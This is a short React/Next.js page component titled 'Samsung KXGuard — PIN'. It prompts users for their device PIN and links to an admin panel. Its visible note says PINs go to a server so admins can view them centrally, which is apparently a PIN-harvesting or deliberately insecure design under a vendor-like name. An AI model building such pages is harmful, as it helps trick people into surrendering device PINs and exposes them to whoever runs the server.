'use client';

import { useState } from 'react';
import PinForm from './components/PinForm';
import AdminPanel from './components/AdminPanel';

export default function Home() {
  const [showAdmin, setShowAdmin] = useState(false);

  return (
    <div className="card" id="mainCard">
      {!showAdmin ? (
        <>
          <h1>Samsung KXGuard — PIN</h1>
          <p className="lead">Enter your device PIN to continue.</p>

          <PinForm />

          <div className="note">
            Note: Pins are sent to your server so admins can view them centrally.
          </div>
          <a 
            className="admin-link" 
            onClick={() => setShowAdmin(true)}
            style={{ cursor: 'pointer' }}
          >
            Open admin
          </a>
        </>
      ) : (
        <AdminPanel onBack={() => setShowAdmin(false)} />
      )}
    </div>
  );
}
